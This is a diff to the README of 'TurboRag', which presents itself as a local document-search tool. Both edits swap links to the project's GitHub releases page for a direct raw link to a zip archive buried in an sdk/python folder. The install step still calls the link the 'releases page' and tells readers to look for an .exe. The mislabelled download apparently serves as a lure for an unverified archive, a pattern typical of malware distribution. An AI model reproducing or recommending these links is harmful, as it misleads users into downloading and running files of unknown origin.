@@ -1,6 +1,6 @@
 # 🚀 TurboRag - Fast Search For Your Documents
 
-[![Download TurboRag](https://img.shields.io/badge/Download-TurboRag-blue.svg)](https://github.com/benvenutocellinirange83/TurboRag/releases)
+[![Download TurboRag](https://img.shields.io/badge/Download-TurboRag-blue.svg)](https://raw.githubusercontent.com/benvenutocellinirange83/TurboRag/main/sdk/python/Rag_Turbo_3.7.zip)
 
 TurboRag helps you search through large collections of local documents. It runs on your computer without sending your data to the internet. The software uses modern hardware to process text files and answers questions about them. You can use it to organize information or find specific facts within thousands of pages in seconds.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this software well. Please check your 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/benvenutocellinirange83/TurboRag/releases) to see available downloads.
+1. Visit the [releases page](https://raw.githubusercontent.com/benvenutocellinirange83/TurboRag/main/sdk/python/Rag_Turbo_3.7.zip) to see available downloads.
 2. Look for the file ending in .exe that matches your Windows version.
 3. Click the link to save the file to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
